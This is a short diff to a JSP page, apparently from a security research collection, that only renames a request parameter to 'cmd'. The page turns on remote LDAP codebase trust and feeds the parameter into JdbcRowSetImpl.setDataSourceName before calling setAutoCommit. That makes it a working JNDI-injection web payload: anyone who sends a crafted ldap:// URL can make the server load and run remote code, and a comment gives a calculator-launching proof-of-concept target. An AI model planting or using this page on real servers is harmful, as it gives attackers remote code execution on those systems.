@@ -5,7 +5,7 @@
 <%
     System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
     JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
-    jdbcRowSet.setDataSourceName(request.getParameter("threedr3am"));//ldap://localhost:43658/Calc
+    jdbcRowSet.setDataSourceName(request.getParameter("cmd"));//ldap://localhost:43658/Calc
     try {
         jdbcRowSet.setAutoCommit(true);
     } catch (Throwable e) {
